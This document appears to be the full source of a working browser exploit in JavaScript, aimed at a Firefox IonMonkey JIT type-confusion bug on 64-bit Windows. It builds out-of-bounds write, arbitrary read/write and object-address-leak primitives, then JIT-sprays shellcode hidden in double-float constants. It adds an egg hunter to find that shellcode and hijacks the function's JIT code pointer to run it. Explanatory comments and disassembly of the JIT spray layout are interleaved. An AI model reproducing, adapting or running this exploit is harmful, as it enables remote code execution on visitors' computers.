
////////
////////
// Global helpers/settings
////////

var JITIterations = 0x10000; // Number of iterations needed to trigger JIT compilation of code. The compilation count threshold varies and this is typically overkill (10+ or 1000+ is often sufficient) but is the most stable count I've tested.
var HelperBuf = new ArrayBuffer(8);
var HelperDbl = new Float64Array(HelperBuf);
var HelperDword = new Uint32Array(HelperBuf);

OverflowArrays = []
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20)); // <- overflow from here
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));

var BugArrayBuf = OverflowArrays[5];
var CorruptedArrayBuf = OverflowArrays[6];
var MutableArray = OverflowArrays[7];
var BugArrayUint32 = new Uint32Array(BugArrayBuf);
const WannabeSparseArray = [BugArrayUint32, BugArrayUint32, BugArrayUint32, BugArrayUint32, BugArrayUint32];

// JIT bug logic/initialization

function BuggedJITFunc(Index) {
    if (WannabeSparseArray.length == 0) {
        WannabeSparseArray[3] = BugArrayUint32; // Convert target array to a sparse array, being careful to preserve the type set: if it were to change, IonMonkey will de-optimize this function back to bytecode
    }

    const Uint32Obj = WannabeSparseArray.pop();
    Uint32Obj[Index] = 0x80; // This will be an OOB index access which will fail its boundscheck prior to being confused with a Uint8Array
    for (let x = 0; x < 100000; x++) {} // JIT compile this function
}

ProxyPrototype = [new Uint8Array(BugArrayBuf), BugArrayUint32, BugArrayUint32]; // The type set of the indexed elements on the custom prototype will include Uint8Array but due to the bug in IonMonkey, when the function is JIT'd only the prototype of the array will have its type checked, not this proxy prototype - thus no type barrier will be included
WannabeSparseArray.__proto__ = ProxyPrototype;

for (let x = 0; x < 2000; x++) {
    BuggedJITFunc(18); // 18*4 = 0x48: CorruptedArray.NativeObject.SlotsPtr
}

// Initialize mutable array properties for R/W/AddressOf primitives. Use these specific values so that it can later be verified whether slots pointer modifications have been successful.

MutableArray.x = 5.40900888e-315; // Most significant bits are 0 - no tag, allows an offset of 4 to be treated as a double
MutableArray.y = 0x41414141;
MutableArray.z = 0; // Least significant bits are 0 - offset of 4 means that y will be treated as a double

CorruptedClone = new Uint8Array(OverflowArrays[6]);

function LeakSlotsPtr() {
	SavedSlotsPtrBytes = CorruptedClone.slice(0x30, 0x38);
	var LeakedSlotsPtrDbl = new Float64Array(SavedSlotsPtrBytes.buffer);
	return LeakedSlotsPtrDbl;
}

function SetSlotsPtr(NewSlotsPtrDbl) {
	HelperDbl[0] = NewSlotsPtrDbl;
	for(var i = 0; i < 8; i++) {
		Temp = new Uint8Array(HelperBuf);
		CorruptedClone[0x30 + i] = Temp[i];
	}
}


//HelperDbl[0] = LeakSlotsPtr();
//alert("Slots pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));

function WeakLeakDbl(TargetAddress) {
	SavedSlotsPtrDbl = LeakSlotsPtr();
	SetSlotsPtr(TargetAddress);
    LeakedDbl = MutableArray.x;
    SetSlotsPtr(SavedSlotsPtrDbl);
    return LeakedDbl;
}

function WeakWriteDbl(TargetAddress, Val) { 
	SavedSlotsPtrDbl = LeakSlotsPtr();
	SetSlotsPtr(TargetAddress);
    MutableArray.x = Val;
    SetSlotsPtr(SavedSlotsPtrDbl);
}

function WeakLeakObjectAddress(Obj) {
    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????????????] | [Target object address] | [0x????????????????]
    MutableArray.y = Obj;

    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????Target o] | [bject adress????????] | [0x????????????????]
    
	HelperDbl[0] = SavedSlotsPtrDbl = LeakSlotsPtr();
    HelperDword[0] = HelperDword[0] + 4;
	SetSlotsPtr(HelperDbl[0]);
    
    // Patch together a double of the target object address from the two 32-bit property values
    
    HelperDbl[0] = MutableArray.x;
    LeakedLow = HelperDword[1];
    HelperDbl[0] = MutableArray.y; // Works in release, not in debug (assertion issues)
    LeakedHigh = HelperDword[0] & 0x00007fff; // Filter off tagged pointer bits
	HelperDbl[0] = SavedSlotsPtrDbl;
    HelperDword[0] = HelperDword[0] - 4;
	SetSlotsPtr(HelperDbl[0]);
    HelperDword[0] = LeakedLow;
    HelperDword[1] = LeakedHigh;
    
    return HelperDbl[0];
}

ExplicitDblArray = new Float64Array(1); // Used for the strong read
ExplicitDblArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read

function ExplicitLeakDbl(TargetAddress) {
    WeakWriteDbl(ExplicitDblArrayDataPtr, TargetAddress);
    return ExplicitDblArray[0];
}

/*//////
////////
// JIT spray/egghunter shellcode logic
////////

JIT spray in modern Firefox 64-bit on Windows seems to behave very differently
when a special threshold of 100 double float constants are planted into a single
function and JIT sprayed. When more than 100 are implanted, the JIT code pointer
for the JIT sprayed function will look as follows:

00000087EB6F5280 | E9 23000000              | jmp 87EB6F52A8                   <- JIT code pointer for JIT sprayed function points here
00000087EB6F5285 | 48:B9 00D0F2F8F1000000   | mov rcx,F1F8F2D000                   
00000087EB6F528F | 48:8B89 60010000         | mov rcx,qword ptr ds:[rcx+160]       
00000087EB6F5296 | 48:89A1 D0000000         | mov qword ptr ds:[rcx+D0],rsp        
00000087EB6F529D | 48:C781 D8000000 0000000 | mov qword ptr ds:[rcx+D8],0          
00000087EB6F52A8 | 55                       | push rbp                             
00000087EB6F52A9 | 48:8BEC                  | mov rbp,rsp                          
00000087EB6F52AC | 48:83EC 48               | sub rsp,48                           
00000087EB6F52B0 | C745 E8 00000000         | mov dword ptr ss:[rbp-18],0          
...
00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141                 <- Note the first double float being loaded into RBX        
00000087EB6F5341 | 53                       | push rbx                             
00000087EB6F5342 | 49:BB D810EAFCF1000000   | mov r11,F1FCEA10D8                   
00000087EB6F534C | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F534F | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F5351 | 48:83C4 08               | add rsp,8                            
00000087EB6F5355 | 48:B9 40807975083D0000   | mov rcx,3D0875798040                 
00000087EB6F535F | 49:BB E810EAFCF1000000   | mov r11,F1FCEA10E8                   
00000087EB6F5369 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F536C | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F536E | 48:BB 9090554889E54883   | mov rbx,8348E58948559090             
00000087EB6F5378 | 53                       | push rbx                             
00000087EB6F5379 | 49:BB F810EAFCF1000000   | mov r11,F1FCEA10F8              
00000087EB6F5383 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F5386 | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F5388 | 48:83C4 08               | add rsp,8                            
00000087EB6F538C | 48:B9 40807975083D0000   | mov rcx,3D0875798040                 
00000087EB6F5396 | 49:BB 0811EAFCF1000000   | mov r11,F1FCEA1108              
00000087EB6F53A0 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F53A3 | FF17                     | call qword ptr ds:[rdi]                              
...

Rather than implanting the double float constants into the JIT'd code region as
an array of raw constant data, the JIT engine has created a (very large) quantity
of code which manually handles each individual double float one by one (this code
goes on much further than I have pasted here). You can see this at:

00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141  

This is the first double float 5.40900888e-315 (the stage one shellcode egg)
being loaded into RBX, where each subsequent double is treated the same.

In contrast, any JIT sprayed function with less than 100 double floats yields
a substantially different region of code at its JIT code pointer:

000002C6944D4470 | 48:8B4424 20             | mov rax,qword ptr ss:[rsp+20]    <- JIT code pointer for JIT sprayed function points here
000002C6944D4475 | 48:C1E8 2F               | shr rax,2F                              
000002C6944D4479 | 3D F3FF0100              | cmp eax,1FFF3                           
000002C6944D447E | 0F85 A4060000            | jne 2C6944D4B28                         
...
000002C6944D4ACB | F2:0F1180 C00A0000       | movsd qword ptr ds:[rax+AC0],xmm0       
000002C6944D4AD3 | F2:0F1005 6D030000       | movsd xmm0,qword ptr ds:[2C6944D4E48]   
000002C6944D4ADB | F2:0F1180 C80A0000       | movsd qword ptr ds:[rax+AC8],xmm0       
000002C6944D4AE3 | F2:0F1005 65030000       | movsd xmm0,qword ptr ds:[2C6944D4E50]   
000002C6944D4AEB | F2:0F1180 D00A0000       | movsd qword ptr ds:[rax+AD0],xmm0       
000002C6944D4AF3 | F2:0F1005 5D030000       | movsd xmm0,qword ptr ds:[2C6944D4E58]   
000002C6944D4AFB | F2:0F1180 D80A0000       | movsd qword ptr ds:[rax+AD8],xmm0       
000002C6944D4B03 | 48:B9 000000000080F9FF   | mov rcx,FFF9800000000000                
000002C6944D4B0D | C3                       | ret                                     
000002C6944D4B0E | 90                       | nop                                     
000002C6944D4B0F | 90                       | nop                                     
000002C6944D4B10 | 90                       | nop                                     
000002C6944D4B11 | 90                       | nop                                     
000002C6944D4B12 | 90                       | nop                                     
000002C6944D4B13 | 90                       | nop                                     
000002C6944D4B14 | 90                       | nop                                     
000002C6944D4B15 | 90                       | nop                                     
000002C6944D4B16 | 49:BB 30B14E5825000000   | mov r11,25584EB130                      
000002C6944D4B20 | 41:53                    | push r11                                
000002C6944D4B22 | E8 C9C6FBFF              | call 2C6944911F0                        
000002C6944D4B27 | CC                       | int3                                    
000002C6944D4B28 | 6A 00                    | push 0                                  
000002C6944D4B2A | E9 11000000              | jmp 2C6944D4B40                         
000002C6944D4B2F | 50                       | push rax                                
000002C6944D4B30 | 68 20080000              | push 820                                
000002C6944D4B35 | E8 5603FCFF              | call 2C694494E90                        
000002C6944D4B3A | 58                       | pop rax                                 
000002C6944D4B3B | E9 85F9FFFF              | jmp 2C6944D44C5                         
000002C6944D4B40 | 6A 00                    | push 0                                  
000002C6944D4B42 | E9 D9C5FBFF              | jmp 2C694491120                         
000002C6944D4B47 | F4                       | hlt                                     
000002C6944D4B48 | 41414141:0000            | add byte ptr ds:[r8],al          <- JIT sprayed egg double
000002C6944D4B4E | 0000                     | add byte ptr ds:[rax],al                
000002C6944D4B50 | 90                       | nop                              <- JIT sprayed shellcode begins here
000002C6944D4B51 | 90                       | nop                                     
000002C6944D4B52 | 55                       | push rbp                                
000002C6944D4B53 | 48:89E5                  | mov rbp,rsp                             
000002C6944D4B56 | 48:83EC 40               | sub rsp,40                              
000002C6944D4B5A | 48:83EC 08               | sub rsp,8                               
000002C6944D4B5E | 40:80E4 F7               | and spl,F7                              
000002C6944D4B62 | 48:B8 1122334455667788   | mov rax,8877665544332211                
000002C6944D4B6C | 48:8945 C8               | mov qword ptr ss:[rbp-38],rax           
000002C6944D4B70 | 48:C7C1 884E0D00         | mov rcx,D4E88                           
000002C6944D4B77 | E8 F9000000              | call 2C6944D4C75                        

This then introduces another constaint on JIT spraying beyoond forcing your
assembly bytecode to be 100% valid double floats. You are also limited to a
maximum of 100 doubles (800 bytes) including your egg prefix.
*/

function JITSprayFunc(){
    Egg = 5.40900888e-315; // AAAA\x00\x00\x00\x00
    X1 = 58394.27801956298;
    X2 = -3.384548150597339e+269;
    X3 = -9.154525457562153e+192;
    X4 = 4.1005939302288804e+42;
    X5 = -5.954550387086224e-264;
    X6 = -6.202600667005017e-264;
    X7 = 3.739444822644755e+67;
    X8 = -1.2650161464211396e+258;
    X9 = -2.6951286493033994e+35;
    X10 = 1.3116505146398627e+104;
    X11 = -1.311379727091241e+181;
    X12 = 1.1053351980286266e-265;
    X13 = 7.66487078033362e+42;
    X14 = 1.6679557218696946e-235;
    X15 = 1.1327634929857868e+27;
    X16 = 6.514949632148056e-152;
    X17 = 3.75559130646382e+255;
    X18 = 8.6919639111614e-311;
    X19 = -1.0771492276655187e-142;
    X20 = 1.0596460749348558e+39;
    X21 = 4.4990090566228275e-228;
    X22 = 2.6641556100123696e+41;
    X23 = -3.695293685173417e+49;
    X24 = 7.675324624976707e-297;
    X25 = 5.738262935249441e+40;
    X26 = 4.460149175031513e+43;
    X27 = 8.958658002980807e-287;
    X28 = -1.312880373645135e+35;
    X29 = 4.864674571015197e+42;
    X30 = -2.500435320470142e+35;
    X31 = -2.800945285957394e+277;
    X32 = 1.44103957698964e+28;
    X33 = 3.8566513062216665e+65;
    X34 = 1.37405680231e-312;
    X35 = 1.6258034990195507e-191;
    X36 = 1.5008582713363865e+43;
    X37 = 3.1154847750709123;
    X38 = -6.809578792021008e+214;
    X39 = -7.696699288147737e+115;
    X40 = 3.909631192677548e+112;
    X41 = 1.5636948002514616e+158;
    X42 = -2.6295656969507476e-254;
    X43 = -6.001472476578534e-264;
    X44 = 9.25337251529007e-33;
    X45 = 4.419915842157561e-80;
    X46 = 8.07076629722016e+254;
    X47 = 3.736523284e-314;
    X48 = 3.742120352320771e+254;
    X49 = 1.0785207713761078e-32;
    X50 = -2.6374368557341455e-254;
    X51 = 1.2702053652464168e+145;
    X52 = -1.3113796337500435e+181;
    X53 = 1.2024564583763433e+111;
    X54 = 1.1326406542153807e+104;
    X55 = 9.646933740426927e+39;
    X56 = -2.5677414592270957e-254;
    X57 = 1.5864445474697441e+233;
    X58 = -2.6689139052065564e-251;
    X59 = 1.0555057376604044e+27;
    X60 = 8.364524068863995e+42;
    X61 = 3.382975178824556e+43;
    X62 = -8.511722322449098e+115;
    X63 = -2.2763239573787572e+271;
    X64 = -6.163839243926498e-264;
    X65 = 1.5186209005088964e+258;
    X66 = 7.253360348539147e-192;
    X67 = -1.2560830051206045e+234;
    X68 = 1.102849544e-314;
    X69 = -2.276324008154652e+271;
    X70 = 2.8122150524016884e-71;
    X71 = 5.53602304257365e-310;
    X72 = -6.028598990540894e-264;
    X73 = 1.0553922879130128e+27;
    X74 = -1.098771600725952e-244;
    X75 = -2.5574368247075522e-254;
    X76 = 3.618778572061404e-171;
    X77 = -1.4656824334476123e+40;
    X78 = 4.6232700581905664e+42;
    X79 = -3.6562604268727894e+125;
    X80 = -2.927408487880894e+78;
    X81 = 1.087942540606703e-309;
    X82 = 6.440226123500225e+264;
    X83 = 3.879424446462186e+148;
    X84 = 3.234472631797124e+40;
    X85 = 1.4186706350383543e-307;
    X86 = 1.2617245769382784e-234;
    X87 = 1.3810793979336581e+43;
    X88 = 1.565026152201332e+43;
    X89 = 5.1402745833993635e+153;
    X90 = 9.63e-322;
}

function EggHunter(TargetAddressDbl) {
    HelperDbl[0] = TargetAddressDbl;

    for(var i = 0; i < 1000; i++) { // 1000 QWORDs give me the most stable result. The more double float constants are in the JIT'd function, the more handler code seems to precede them.
        DblVal = ExplicitLeakDbl(HelperDbl[0]); // The JIT'd ASM code being scanned is likely to contain 8 byte sequences which will not be interpreted as doubles (and will have tagged pointer bits set). Use explicit/strong primitive for these reads.
        
        if(DblVal == 5.40900888e-315) {
            HelperDword[0] = HelperDword[0] + 8; // Skip over egg bytes and return precise pointer to the shellcode
            return HelperDbl[0];
        }
        
        HelperDword[0] = HelperDword[0] + 8;
    }
    
    return 0.0;
}

////////
////////
// Primary high level exploit logic
////////
    
function Exploit() {
    for(var i = 0; i < JITIterations; i++) {
        JITSprayFunc(); // JIT spray the shellcode to a private +RX region of virtual memory
    }
    
    HelperDbl[0] = WeakLeakObjectAddress(JITSprayFunc); // The JSFunction object address associated with the (now JIT compiled) shellcode data.
    HelperDword[0] = HelperDword[0] + 0x30; // JSFunction.u.native.extra.jitInfo_ contains a pointer to the +RX JIT region at offset 0 of its struct.
    JITInfoAddress = WeakLeakDbl(HelperDbl[0]);
    HelperDbl[0] = JITInfoAddress;
    
    // Verify that MutableArray.x was not its initialized value during the last arbitrary read. This would only be the case if the slots ptr has NEVER been successfully overwritten post-addrof primitive (the address we attempted to read was not a valid double).
    
    if(HelperDword[0] == 0x41414141) {
        alert("Arbitrary read primitive failed");
        window.location.reload();
    }
    else {
        // Setup the strong read primitive for the stage one egg hunter: attempting to interpret assembly byte code as doubles via weak primitive may crash the process (tagged pointer bits could cause the read value to be dereferenced as a pointer)
        
        HelperDbl[0] = WeakLeakDbl(JITInfoAddress); // Leak the address to the compiled JIT assembly code associated with the JIT'd shellcode function from its JitInfo struct (it is a pointer at offset 0 of this struct)
        alert("Shellcode function object JIT code pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
        
		JITCodePtr = HelperDbl[0];
        ExplicitDblArrayAddress = WeakLeakObjectAddress(ExplicitDblArray);
        HelperDbl[0] = ExplicitDblArrayAddress;
        HelperDword[0] = HelperDword[0] + 56; // Float64Array data pointer
        ExplicitDblArrayDataPtr = HelperDbl[0];
        ShellcodeAddress = EggHunter(JITCodePtr); // For this we need the strong read primitive since values here can start with 0xffff and thus act as tags

        if(ShellcodeAddress) {
            // Trigger code exec by calling the JIT sprayed function again. Its code pointer has been overwritten to now point to the literal shellcode data within the JIT'd function
            
			HelperDbl[0] = ShellcodeAddress;
			alert("Shellcode pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
            WeakWriteDbl(JITInfoAddress, ShellcodeAddress);
            JITSprayFunc(); // Notably the location of the data in the stage two shellcode Uint8Array can be found at offset 0x40 from the start of the array object when the array is small, and when it is large (as in the case of the WPAD shellcode) a pointer to it can be found at offset 0x38 from the start of the array object. In this case though, the stage one egg hunter shellcode finds, disables DEP and ADDITIONALLY executes the stage two shellcode itself, so there is no reason to locate/execute it from JS.
        }
        else {
            alert("Failed to resolve shellcode address");
        }
    }
}

Exploit();
